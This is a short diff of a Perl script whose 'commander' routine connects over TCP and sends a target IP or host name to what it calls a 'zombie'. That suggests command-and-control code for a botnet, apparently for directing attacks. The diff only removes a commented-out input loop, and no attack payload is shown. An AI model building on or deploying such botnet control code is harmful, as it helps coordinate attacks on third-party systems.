@@ -78,12 +78,6 @@ sub commander {
         Proto => 'tcp'
     );
     die "Unable to connect to $ipAddr: $!\n" unless $socket;
-    #print "Target IP or HostName: ";
-    ###while(<STDIN>) {
-    ##    $socket->send($_);
-    ##    print "Sending command to zombie!!!\n";
-    ##    shutdown($socket, 1);
-    ##}
     print "$targetIP\n";
     $socket->send($targetIP);
     print "Sending command to zombie!!!\n";
